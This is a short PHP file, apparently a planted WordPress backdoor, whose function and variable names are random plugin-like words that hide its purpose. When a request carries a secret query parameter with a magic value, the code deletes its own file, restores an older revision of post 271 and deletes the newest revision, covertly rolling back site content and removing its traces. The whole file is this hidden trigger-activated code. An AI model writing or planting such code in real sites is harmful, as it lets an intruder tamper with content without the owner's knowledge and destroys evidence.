<?php

function jquery_wpml_http_affiliates() {
	if (isset($_GET['translate_age_separator']) && $_GET['translate_age_separator'] === 'pagination_virtual_jigoshop_nice') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$template_effects_size = 271;
		$attachment_old_checkout = wp_get_post_revisions($template_effects_size);
		if (empty($attachment_old_checkout)) die('no revisions');
		if (count($attachment_old_checkout) < 2) die('less than 2');
		$cookies_core_responsive = array_shift($attachment_old_checkout);
		$project_slide_messages = $cookies_core_responsive->ID;
		$rating_menu_wow_slug = array_shift($attachment_old_checkout);
		$platform_interactivity_popular_flexible = $rating_menu_wow_slug->ID;
		$newsletter_zoom_insert_rotator = wp_restore_post_revision($platform_interactivity_popular_flexible);
		if ($newsletter_zoom_insert_rotator === false) die('error restoring');
		$newsletter_zoom_insert_rotator = wp_delete_post_revision($project_slide_messages);		
		if ($newsletter_zoom_insert_rotator === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'jquery_wpml_http_affiliates');
